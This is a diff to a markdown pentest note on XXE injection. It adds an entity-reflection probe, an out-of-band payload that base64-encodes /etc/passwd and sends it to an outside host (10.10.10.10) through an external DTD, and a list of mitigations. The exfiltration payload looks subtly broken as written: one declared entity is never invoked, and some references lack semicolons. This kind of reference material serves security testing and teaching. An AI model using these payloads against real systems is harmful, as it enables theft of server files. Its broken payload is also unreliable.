@@ -16,9 +16,20 @@ intent:
 ---
 ## Definition
 Exploitation of outdated [XML]{Extensible Markup Language} libraries used for parsing user input without proper sanitization
+- error based
+- out-of-band data exfiltration
 
 ## Discovery
-test if it's possible to call entities
+test if it's possible to call entities and if any of the provided values are reflected back to the user
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+	<!ENTITY pwned "ArbitraryCreatedEntity">
+]>
+<root>&pwned;</root>
+```
+
 find error based injections by producing an error
 
 ```xml
@@ -86,6 +97,31 @@ and including in the vulnerable endpoit
 <root></root>
 ```
 
+Or an out-of-band data exfiltration
+
+```txt
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % exfiltration SYSTEM '<!ENTITY oob SYSTEM "http://10.10.10.10/?data=%file;">'>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+	<!ENTITY % pwned SYSTEM "http://10.10.10.10/xxe.dtd">
+	%file
+	%exfiltration
+]>
+<email>
+	<date>00-00-0000</date>
+	<time>00:00 am UTC</time>
+	<sender>usr@domain.com</sender>
+	<recipients>
+		<to>usr@domain.com</to>
+	</recipients>
+	<body>&oob;</body>
+</email>
+```
+
 [RCE]{Remote Code Evaluation} when `expect` is installed and enabled
 
 ```xml
@@ -135,6 +171,14 @@ and including in the vulnerable endpoit
 ```
 
 ## Mitigation
+- Update XML libraries and any component that parses it
+- Disable the display of runtime errors in web servers
+- Disable referencing custom `Document Type Definitions (DTDs)`
+- Disable referencing `External XML Entities`
+- Disable `Parameter Entity` processing
+- Disable support for `XInclude`
+- Prevent `Entity Reference Loops`
+- Implement WAF
 
 ## Evasion
 
